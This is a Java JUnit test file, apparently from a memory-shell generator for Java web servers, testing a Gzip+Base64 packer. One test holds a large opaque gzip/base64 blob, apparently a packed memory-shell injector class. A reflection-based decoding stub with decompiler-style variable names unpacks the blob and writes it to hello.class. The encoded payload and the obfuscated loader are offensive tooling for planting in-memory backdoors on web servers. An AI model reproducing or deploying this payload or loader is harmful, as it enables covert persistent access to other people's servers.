package com.reajason.javaweb.memshell.packer;

import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import com.reajason.javaweb.utils.CommonUtil;
import lombok.SneakyThrows;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

import static org.junit.jupiter.api.Assertions.assertEquals;



/**
 * @author ReaJason
 * @since 2025/1/22
 */
class GzipBase64Test {

    @Test
    @SneakyThrows
    void compress() {
        MemShellResult generateResult = new MemShellResult();
        generateResult.setInjectorBytes("hello world".getBytes());
        String pack = new GzipBase64Packer().pack(generateResult.toClassPackerConfig());
        assertEquals("hello world", new String(CommonUtil.gzipDecompress(Base64.getDecoder().decode(pack))));
    }

    @Test
    @SneakyThrows
    void decompress() {
        String var9 = "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";
        byte[] var11 = null;

        Class elapsedTime;
        try {
            elapsedTime = Class.forName("java.util.Base64");
            Object var12 = elapsedTime.getMethod("getDecoder", (Class[]) null).invoke(elapsedTime, (Object[]) null);
            var11 = (byte[]) var12.getClass().getMethod("decode", String.class).invoke(var12, var9);
        } catch (Exception var34) {
            try {
                elapsedTime = Class.forName("sun.misc.BASE64Decoder");
                Object var14 = elapsedTime.newInstance();
                var11 = (byte[]) var14.getClass().getMethod("decodeBuffer", String.class).invoke(var14, var9);
            } catch (Exception var33) {
            }
        }

        ByteArrayOutputStream var16 = new ByteArrayOutputStream();
        ByteArrayInputStream var17 = new ByteArrayInputStream(var11);
        GZIPInputStream var18 = new GZIPInputStream(var17);
        byte[] var19 = new byte[256];

        int var20;
        while ((var20 = var18.read(var19)) >= 0) {
            var16.write(var19, 0, var20);
        }

        byte[] var21 = var16.toByteArray();
        Files.write(Paths.get("hello.class"), var21);
    }
}